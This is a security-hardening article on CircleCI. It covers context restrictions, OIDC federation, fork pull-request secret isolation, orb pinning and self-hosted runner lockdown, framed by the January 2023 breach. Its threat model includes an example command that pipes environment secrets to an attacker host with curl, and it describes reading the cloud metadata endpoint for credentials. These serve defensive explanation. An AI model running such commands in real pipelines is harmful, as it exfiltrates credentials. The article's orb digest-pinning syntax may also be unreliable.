---
title: "CircleCI Security Hardening: Contexts, OIDC, and Runner Isolation"
description: "The January 2023 CircleCI breach showed that CI platforms are high-value targets. Hardening CircleCI means securing contexts with group-based restrictions, replacing static credentials with OIDC tokens, locking down self-hosted runners, and preventing fork pipelines from touching secrets."
slug: circleci-security-hardening
date: 2026-05-07
lastmod: 2026-05-07
category: cicd
tags:
  - circleci
  - ci-security
  - context-security
  - pipeline-security
  - oidc
personas:
  - security-engineer
  - platform-engineer
article_number: 533
difficulty: Intermediate
estimated_reading_time: 12
published: true
layout: article.njk
permalink: /articles/cicd/circleci-security-hardening/
---

# CircleCI Security Hardening: Contexts, OIDC, and Runner Isolation

## Problem

CircleCI sits at the intersection of source code and production infrastructure. Every pipeline run has potential access to deployment credentials, cloud provider tokens, signing keys, and database passwords. The January 2023 CircleCI security incident made this concrete: attackers exfiltrated customer secrets that had been stored as environment variables and context secrets across thousands of organisations.

Common security failures in CircleCI deployments:

- **Contexts available to all projects in an organisation.** A context is CircleCI's named collection of environment variables. By default, any project in the organisation can reference any context. A context holding production cloud credentials is therefore accessible from every repository, including low-trust experimental projects.
- **Static long-lived credentials stored as environment variables.** AWS access keys, GCP service account JSON, and similar credentials stored directly as environment variables are long-lived. If they are exfiltrated — from a compromised session, a rogue pipeline step, or a platform incident — they remain valid until manually rotated.
- **Fork pull requests accessing secrets.** By default, pipelines triggered by pull requests from forked repositories run in the context of the upstream project. A fork pipeline can reference contexts and project-level environment variables, handing a credential to a contributor with no write access.
- **Mutable orb version references.** CircleCI orbs are reusable pipeline components published to the orb registry. Referencing an orb as `circleci/aws-cli@4` pins to a mutable tag. The publisher can push a new version under that tag. A compromised orb publisher can inject malicious code into every pipeline that uses the tag.
- **Self-hosted runners with excessive host access.** Self-hosted runners execute jobs on your own infrastructure. A runner with access to the host Docker socket, mounted cloud credential files, or instance metadata endpoints gives any job root-equivalent access to the host and its attached identity.
- **Unreviewed branch pipelines executing deployment jobs.** Without branch filters on context usage, a developer branch that modifies `.circleci/config.yml` can trigger a deployment job that consumes production context secrets.

**Target systems:** CircleCI cloud (circleci.com); CircleCI server (self-managed, 4.x+); CircleCI self-hosted runner (launch-agent 3.x+, container runner 1.x+); CircleCI OIDC for cloud provider federation (AWS, GCP, Azure).

## Threat Model

- **Adversary 1 — Context secret exfiltration via low-trust project:** An attacker with write access to a low-trust project in the organisation creates a workflow that references a high-value context (e.g., `production-aws`) and runs `env | curl -X POST https://attacker.com --data-binary @-`. Because contexts are not restricted to specific projects, the exfiltration succeeds.
- **Adversary 2 — Fork pull request credential theft:** An external contributor forks a public repository and opens a pull request. The pipeline triggers with access to project environment variables and unrestricted contexts. The fork pipeline exfiltrates any static credentials in scope.
- **Adversary 3 — Compromised orb supply chain:** An attacker compromises the CircleCI account of an orb publisher. They push a new patch version under an existing mutable tag. Every pipeline using that orb tag executes the attacker's code in the next run and can exfiltrate all environment variables visible to the job.
- **Adversary 4 — Self-hosted runner host compromise:** A malicious pipeline job on a self-hosted runner reads the EC2 instance metadata endpoint (`169.254.169.254/latest/meta-data/iam/`) to obtain the attached instance role's credentials. The credentials give access to the cloud environment the runner lives in.
- **Adversary 5 — Session token theft (as in January 2023):** An attacker obtains a valid employee session token (via malware, phishing, or an insider). The token provides access to the CircleCI web interface and, critically, the ability to read stored context secrets and project environment variables that are encrypted at rest but decryptable through the platform API.
- **Access level:** Adversaries 1 and 2 need write or fork access to a repository. Adversary 3 exploits the supply chain. Adversary 4 needs pipeline execution on a self-hosted runner. Adversary 5 requires a valid session token.
- **Objective:** Exfiltrate cloud credentials; execute code in production; pivot to adjacent infrastructure.
- **Blast radius:** Contexts containing production cloud credentials are equivalent to long-lived keys for the entire account. A single exfiltrated context can provide access to all resources the CI pipeline deploys to.

## The January 2023 CircleCI Incident

In January 2023, CircleCI disclosed a significant security breach. The attack chain, as publicly disclosed by CircleCI, proceeded through the following stages:

1. An attacker deployed malware on a CircleCI engineer's laptop.
2. The malware bypassed the engineer's hardware-based two-factor authentication by stealing a valid, authenticated session token directly from the browser.
3. With a live session token, the attacker authenticated to CircleCI's internal systems without triggering 2FA prompts.
4. The attacker accessed a production database backup and exfiltrated customer data, including environment variables, tokens, and keys stored in contexts and project settings.

The data exfiltrated included both encrypted and unencrypted secrets. Encrypted secrets could potentially be decrypted by the attacker using encryption keys also present in the exfiltrated data.

Key lessons from the incident:

- **Session tokens are credentials.** Hardware 2FA protects login but not a live session. Short session lifetimes and aggressive re-authentication requirements reduce the window an attacker has with a stolen token.
- **Long-lived static credentials amplify breach impact.** Short-lived OIDC tokens would have been expired by the time the attacker could use them. Organisations that had already adopted OIDC federation for cloud access were largely unaffected for those credential types.
- **The CI platform is a credential store.** Every secret in a context or project environment variable is a target. Secrets that do not need to be in CircleCI should not be there.
- **Rotation speed matters.** CircleCI advised all customers to rotate all secrets immediately. Organisations with large numbers of manually managed credentials discovered that "rotate everything immediately" is operationally very difficult with static keys.

## Configuration

### Step 1: Restrict Contexts to Security Groups

By default, any project in the organisation can reference any context. Restrict contexts to specific security groups so that only authorised projects and teams can use production secrets.

```yaml
# .circleci/config.yml — reference a context that is restricted to a security group.
# The context restriction is configured in the CircleCI web UI (Organisation Settings → Contexts).
# Here we declare the context name used in the workflow.

workflows:
  deploy:
    jobs:
      - deploy-production:
          context:
            - production-aws    # This context is restricted to the "production-deployers" group.
          filters:
            branches:
              only: main
```

Configure the context restriction in the CircleCI web interface:

```
Organisation Settings → Contexts → production-aws → Security Groups:
  Restrict context: ON
  Security groups:
    - production-deployers    # Only members of this group can use this context.
```

Context security group restrictions enforce that:

- Only pipelines running in the context of a project whose team is in `production-deployers` can reference `production-aws`.
- A developer in a different team cannot create a workflow in a low-trust project that references the production context.
- Branch filter violations do not bypass the group restriction.

Use separate contexts per environment with separate group restrictions:

| Context name | Security group | Contents |
|---|---|---|
| `production-aws` | `production-deployers` | Production IAM role ARN, region |
| `staging-aws` | `engineers` | Staging IAM role ARN |
| `npm-publish` | `release-team` | NPM publish token |
| `signing-keys` | `release-team` | Code signing certificate |

### Step 2: Replace Static Credentials with OIDC Tokens

CircleCI supports OpenID Connect (OIDC) token issuance per job. Each job receives a short-lived OIDC token (`$CIRCLE_OIDC_TOKEN`) signed by CircleCI's OIDC issuer. Cloud providers can be configured to trust these tokens, eliminating the need for static API keys.

**AWS configuration — IAM OIDC trust policy:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/oidc.circleci.com/org/YOUR_ORG_ID"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "oidc.circleci.com/org/YOUR_ORG_ID:aud": "YOUR_ORG_ID"
        },
        "StringLike": {
          "oidc.circleci.com/org/YOUR_ORG_ID:sub": "org/YOUR_ORG_ID/project/YOUR_PROJECT_ID/user/*"
        }
      }
    }
  ]
}
```

Tighten the `sub` claim condition to restrict to a specific project. Do not use `org/YOUR_ORG_ID/*` as the subject pattern — this allows any project in the organisation to assume the role.

**CircleCI workflow — exchange OIDC token for AWS credentials:**

```yaml
# .circleci/config.yml
version: 2.1

jobs:
  deploy-production:
    docker:
      - image: cimg/aws:2024.03
    steps:
      - checkout
      - run:
          name: Assume AWS role via OIDC
          command: |
            # CIRCLE_OIDC_TOKEN is automatically available in jobs with OIDC enabled.
            # No static AWS credentials needed in context or environment variables.
            CREDENTIALS=$(aws sts assume-role-with-web-identity \
              --role-arn "$AWS_ROLE_ARN" \
              --role-session-name "circleci-${CIRCLE_BUILD_NUM}" \
              --web-identity-token "$CIRCLE_OIDC_TOKEN" \
              --duration-seconds 3600 \
              --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
              --output text)
            echo "export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | awk '{print $1}')" >> $BASH_ENV
            echo "export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | awk '{print $2}')" >> $BASH_ENV
            echo "export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | awk '{print $3}')" >> $BASH_ENV
      - run:
          name: Deploy
          command: ./deploy.sh

workflows:
  deploy:
    jobs:
      - deploy-production:
          context:
            - production-aws    # Context now only needs AWS_ROLE_ARN and AWS_REGION, not keys.
          filters:
            branches:
              only: main
```

**GCP configuration — Workload Identity Federation:**

```bash
# Configure GCP Workload Identity Pool for CircleCI.
gcloud iam workload-identity-pools create "circleci-pool" \
  --project="YOUR_PROJECT" \
  --location="global" \
  --display-name="CircleCI"

gcloud iam workload-identity-pools providers create-oidc "circleci-provider" \
  --project="YOUR_PROJECT" \
  --location="global" \
  --workload-identity-pool="circleci-pool" \
  --display-name="CircleCI OIDC" \
  --attribute-mapping="google.subject=assertion.sub,attribute.project_id=assertion['oidc.circleci.com/project-id']" \
  --issuer-uri="https://oidc.circleci.com/org/YOUR_ORG_ID"

# Bind the service account to the specific CircleCI project.
gcloud iam service-accounts add-iam-policy-binding \
  "deploy-sa@YOUR_PROJECT.iam.gserviceaccount.com" \
  --project="YOUR_PROJECT" \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/circleci-pool/attribute.project_id/YOUR_CIRCLECI_PROJECT_ID"
```

OIDC tokens issued per-job expire after one hour. An exfiltrated token cannot be used after job completion. This directly addresses the primary lesson of the January 2023 incident.

### Step 3: Branch Filters on Context Usage

Context access can be restricted further by combining security groups with branch filters in the workflow definition. Jobs referencing sensitive contexts should only run on protected branches.

```yaml
# .circleci/config.yml — branch filters prevent developer branches from
# triggering jobs that consume production context secrets.

workflows:
  ci:
    jobs:
      # Tests run on every branch.
      - test:
          filters:
            branches:
              ignore: []   # All branches.

      # Build runs on every branch (no secrets needed).
      - build:
          requires:
            - test

      # Staging deploy: only on the develop branch.
      - deploy-staging:
          requires:
            - build
          context:
            - staging-aws
          filters:
            branches:
              only: develop

      # Production deploy: only on main.
      - deploy-production:
          requires:
            - build
          context:
            - production-aws
          filters:
            branches:
              only: main
```

Branch filters combined with security group restrictions create two independent access controls: the context's security group prevents the context from being resolved for unauthorised projects, and the branch filter prevents the job from running on unauthorised branches.

### Step 4: Block Fork Pull Request Access to Secrets

CircleCI's default behaviour allows fork pull requests to trigger pipelines with access to project environment variables and contexts. Disable this.

```
CircleCI Project Settings → Advanced:
  Pass secrets to builds from forked pull requests: OFF   (default: OFF — confirm it is not enabled)
  Build forked pull requests: ON or OFF based on project policy
```

When `Pass secrets to builds from forked pull requests` is disabled (the default and correct setting):

- Fork PR pipelines run with no context secrets and no project environment variables.
- The fork pipeline can still run tests using only public information.
- Secrets are only available to pipelines triggered from within the organisation's own repositories.

For open-source projects that need to run fork PR pipelines with some secrets (e.g., a registry pull token for private base images), use a dedicated restricted context scoped to read-only credentials only — never deploy credentials.

Add an explicit check in the pipeline to fail fast if a fork pipeline incorrectly receives a secret:

```yaml
# .circleci/config.yml — detect unexpected fork pipeline secret access.
jobs:
  deploy-production:
    steps:
      - run:
          name: Verify not a fork pipeline
          command: |
            if [ "$CIRCLE_PR_REPONAME" != "" ] && [ "$CIRCLE_PROJECT_USERNAME" != "$CIRCLE_PR_USERNAME" ]; then
              echo "Fork pipeline detected; aborting deployment job."
              exit 1
            fi
```

### Step 5: Pin Orb Versions with SHA Digests

CircleCI orbs are the primary supply chain risk in `config.yml`. A tag like `circleci/aws-cli@4.1` is mutable. If the orb publisher's account is compromised, an attacker can push new code under the existing tag. Use immutable SHA digest pinning instead.

```yaml
# WRONG — mutable tag reference.
orbs:
  aws-cli: circleci/aws-cli@4.1.0

# CORRECT — immutable SHA digest.
orbs:
  aws-cli: circleci/aws-cli@sha256:4e9e9edf94c93e07f2c5e94e2f7b1d4d8f6e6a2b9c4d5e6f7a8b9c0d1e2f3a4b
```

To find the SHA digest for an orb version:

```bash
# Use the CircleCI CLI to resolve an orb version to its digest.
circleci orb info circleci/aws-cli@4.1.0

# The output includes the digest:
# Latest: circleci/aws-cli@4.1.0
# Orb digest: sha256:...
```

Additional orb hardening practices:

- **Audit orb publishers before use.** Prefer orbs from CircleCI's own namespace (`circleci/`) or from verified partners. Avoid community orbs with few users or recent-only publication history.
- **Review orb source before adopting.** Orbs are public on the registry. Read the commands and executors you are using.
- **Restrict orb usage organisation-wide.** CircleCI Organisation Settings → Security → Orb Security Settings allows you to block use of uncertified or partner orbs across all projects.

```
Organisation Settings → Security:
  Allow uncertified orbs: OFF
  Allow private orbs: ON (internal orbs only)
  Allow certified partner orbs: review per-project need
```

### Step 6: Self-Hosted Runner Security

Self-hosted runners execute jobs on infrastructure you control. They are a common source of privilege escalation: a job running on a self-hosted runner has the OS-level access of the agent process.

**Runner token security:**

```bash
# Runner tokens are issued per resource class. Treat them as credentials.
# Store runner tokens in secrets manager, not in plaintext config files.

# Verify runner tokens are not committed to source:
git log --all --full-history -- '**/*.env' '**/*.toml' | grep -i runner

# Rotate runner tokens on a schedule or after any suspected exposure.
# CircleCI UI: Self-Hosted Runners → Resource Classes → [resource class] → Regenerate Token
```

**Runner agent hardening (Linux):**

```bash
# Run the runner agent as a dedicated non-root user.
useradd --system --no-create-home --shell /usr/sbin/nologin circleci-runner

# Do NOT grant the runner user:
# - Docker socket access (docker group membership)
# - Sudo access
# - Access to cloud credential files (~/.aws, ~/.gcloud, service account JSON)
# - Access to other users' home directories

# Systemd unit file for the runner agent.
# /etc/systemd/system/circleci-runner.service
[Unit]
Description=CircleCI Self-Hosted Runner Agent
After=network.target

[Service]
User=circleci-runner
Group=circleci-runner
ExecStart=/opt/circleci/circleci-launch-agent --config /etc/circleci/runner-config.yaml
Restart=on-failure
# Harden the systemd unit.
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
PrivateDevices=true

[Install]
WantedBy=multi-user.target
```

**Resource class restrictions:**

CircleCI resource classes define which runner fleet services a job. Use separate resource classes for different trust tiers, and restrict which projects can use each class.

```
CircleCI Self-Hosted Runners UI:
  Resource class: production-deploy
    Runner token: [rotated credential]
    Allowed projects: repo-a, repo-b    # Only these projects can schedule on this runner.
    
  Resource class: general-build
    Runner token: [separate credential]
    Allowed projects: all
```

In `config.yml`, reference the resource class explicitly:

```yaml
jobs:
  deploy-production:
    machine:
      resource_class: your-org/production-deploy   # Scoped resource class.
    steps:
      - checkout
      - run: ./deploy.sh
```

**Block EC2 and GCP metadata endpoints if not needed:**

```bash
# On self-hosted runners that do not use the instance's cloud identity,
# block access to the metadata endpoint to prevent credential theft via pipeline code.

# Linux — iptables rule (add to runner host startup):
iptables -A OUTPUT -d 169.254.169.254 -m owner ! --uid-owner circleci-runner -j DROP
# Or, block entirely if the runner does not use instance metadata at all:
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

### Step 7: config.yml Security Practices

The `.circleci/config.yml` file is the primary attack surface for pipeline injection. Any developer with commit access can modify it.

```yaml
# .circleci/config.yml — security-conscious template.
version: 2.1

# Pin all orbs with SHA digests (see Step 5).
orbs:
  aws-cli: circleci/aws-cli@sha256:DIGEST_HERE

# Limit environment variable exposure.
# Do not set secrets as top-level environment variables.
# Bad — available to all jobs:
# environment:
#   AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID

jobs:
  build:
    docker:
      # Pin Docker executor images to SHA digest, not mutable tags.
      - image: cimg/python:3.12@sha256:DIGEST_HERE
    steps:
      - checkout
      - run:
          name: Build
          # Avoid printing environment variables in build scripts.
          # Bad: set -x (prints all commands, including secret interpolation)
          # Good: set -e (exit on error, no echo)
          command: |
            set -eo pipefail
            python -m build

  deploy-production:
    docker:
      - image: cimg/aws:2024.03@sha256:DIGEST_HERE
    steps:
      - checkout
      - run:
          name: Deploy
          # Avoid: echo $AWS_SECRET_ACCESS_KEY, env, printenv
          command: |
            set -eo pipefail
            ./deploy.sh
    # Context secrets are injected only into this job.
    # They do not propagate to child jobs unless explicitly passed.
```

Protect `config.yml` with branch protection on the default branch. Require code review for changes to `.circleci/config.yml` specifically:

```
GitHub / GitLab branch protection for `main`:
  Required reviewers for paths:
    .circleci/**    → security-team (2 reviewers required)
```

### Step 8: Audit Log Access and Retention

CircleCI provides audit logs for organisational events. Route them to a SIEM for alerting and retention.

```bash
# Retrieve audit logs via the CircleCI API.
# Requires an organisation admin token with audit log read scope.
curl --request GET \
  --header "Circle-Token: $CIRCLECI_ADMIN_TOKEN" \
  "https://circleci.com/api/v2/organizations/$ORG_ID/audit-log?limit=100&start_date=2026-01-01" \
  | jq '.items[] | {action, actor_email, target_type, occurred_at}'
```

Key audit log events to alert on:

| Event | Alert condition | Why |
|---|---|---|
| `context.secrets.accessed` | Any access outside normal deploy windows | May indicate exfiltration |
| `context.created` / `context.deleted` | Unexpected changes to production contexts | Administrative change without ticket |
| `user.invite` / `user.remove` | Any change | Account lifecycle event |
| `project.settings.updated` | Changes to fork PR secret settings | Could re-enable fork access to secrets |
| `runner.token.created` | New runner token issued | Should map to provisioning ticket |
| `api_token.created` | New personal API token | Could indicate account takeover |

```bash
# Example: alert when fork secret pass-through is re-enabled.
# In a SIEM rule or scheduled audit log scan:
jq '.items[] | select(.action == "project.settings.updated") | 
    select(.payload.changes.pass_secrets_to_forked_builds == true)' audit.json
```

Retain audit logs for a minimum of 12 months. CircleCI's own retention period for audit logs via the API may be shorter; export and archive to your own storage.

### Step 9: Environment Variable Security

CircleCI project environment variables and context variables are masked in job output by default. Masking prevents the value from appearing in the job's log. However, masking is not encryption: the value is still accessible to any code running in the job.

- **Project environment variables** are stored encrypted at rest by CircleCI, but they are not scoped to specific jobs, branches, or pipelines within that project. Any job in the project can read them.
- **Context variables** benefit from security group access controls and can be restricted by branch filter, making them strictly more secure than project-level variables for sensitive secrets.
- **Ephemeral OIDC tokens** are the most secure option: they are not stored at rest in CircleCI at all.

Variable security tier (most to least secure):

```
OIDC-federated short-lived token    →  Not stored in CircleCI; expires after job
Context variable (group-restricted) →  Stored encrypted; access-controlled by group + branch
Context variable (unrestricted)     →  Stored encrypted; accessible to all org projects
Project environment variable        →  Stored encrypted; accessible to all jobs in project
Hardcoded in config.yml             →  Stored in source control; never acceptable for secrets
```

### Step 10: Telemetry

```
circleci_workflow_duration_seconds{project, workflow, status}          histogram
circleci_job_duration_seconds{project, job, executor}                  histogram
circleci_context_access_total{context, project, branch}                counter
circleci_fork_pipeline_secret_block_total{project}                     counter
circleci_runner_job_total{resource_class, status}                      counter
circleci_oidc_token_exchange_total{project, provider, status}          counter
circleci_orb_used{orb_name, orb_version, pinned_to_digest}             gauge
```

Alert on:

- `circleci_context_access_total` from an unexpected project or branch — context security group bypass or misconfiguration.
- Any production context access outside of business hours or release windows.
- `circleci_fork_pipeline_secret_block_total` is zero for an extended period on an active project — verify fork secret blocking is still enabled.
- OIDC token exchange failures — may indicate a trust policy misconfiguration or attempt to use tokens outside the permitted scope.
- Runner jobs running significantly longer than the baseline — possible exfiltration or cryptominer.

## Expected Behaviour

| Signal | Default CircleCI | Hardened CircleCI |
|---|---|---|
| Low-trust project references production context | Secrets injected into job | Context security group blocks access; job fails |
| Fork PR pipeline runs | Project secrets available to fork | Fork secret pass-through disabled; fork pipeline gets no secrets |
| Static AWS keys stored in context | Long-lived keys at rest in CircleCI | OIDC token; keys are never stored; expire after 1 hour |
| Orb tag updated by publisher | New code runs automatically on next pipeline | SHA-pinned orb; change requires explicit digest update in config.yml |
| Self-hosted runner job reads metadata endpoint | Instance credentials available to job | Metadata endpoint blocked at host level; runner user has no cloud identity |
| Developer branch triggers deployment job | Production context injected into branch pipeline | Branch filter on context usage; job only runs on `main` |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| OIDC over static credentials | Keys never stored; expire on job end | Initial IAM/Workload Identity setup; per-project trust policy | Terraform module for OIDC trust setup; one-time effort per project |
| SHA-pinned orbs | Immutable; supply chain compromise does not auto-execute | Manual digest update required for orb upgrades | Renovate or Dependabot can open PRs to update SHA digests |
| Context security groups | Fine-grained context access control | Group management overhead; requires VCS team sync | Automate group membership from IDP groups via SCIM |
| Fork PR secret isolation | External contributors cannot steal secrets | Fork pipelines cannot test against authenticated services | Provide a read-only restricted context for fork testing where genuinely needed |
| Self-hosted runner metadata blocking | Prevents credential theft via pipeline code | Blocks legitimate use of instance identity | Only block if the runner does not rely on instance metadata; use explicit credentials otherwise |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| Context security group misconfigured | Deployment job fails with missing environment variable | Job log shows undefined variable error | Verify project team is a member of the context security group |
| OIDC trust policy too restrictive | `AssumeRoleWithWebIdentity` denied | Job log shows STS access denied | Check `sub` claim in OIDC token matches trust policy condition |
| SHA-pinned orb digest not updated | Pipeline fails after intentional orb upgrade | Build failure on orb invocation | Update digest in config.yml; do not revert to mutable tag |
| Fork PR testing blocked | External contributor's pipeline produces no test results | Pipeline shows no jobs or jobs with no output | Provide dedicated fork-safe context with read-only credentials |
| Runner token leaked | Unexpected jobs appear in runner resource class | Audit log `runner.job.started` from unknown project | Immediately regenerate runner token; investigate source of leak |
| Branch filter removed from config.yml | Deployment job runs on all branches | Audit log shows context access from unexpected branch | Restore branch filter; require security review for config.yml changes |

## Related Articles

- [GitLab CI Security](/articles/cicd/gitlab-ci-security/)
- [Jenkins Security Hardening](/articles/cicd/jenkins-security-hardening/)
- [OIDC Federation Hardening for CI-to-Cloud](/articles/cicd/oidc-federation-hardening/)
- [CI/CD Secret Management](/articles/cicd/cicd-secret-management/)
- [Securing CI/CD Runners](/articles/cicd/securing-cicd-runners/)
- [Ephemeral Cloud Credentials in CI/CD](/articles/cicd/ephemeral-cloud-credentials-cicd/)
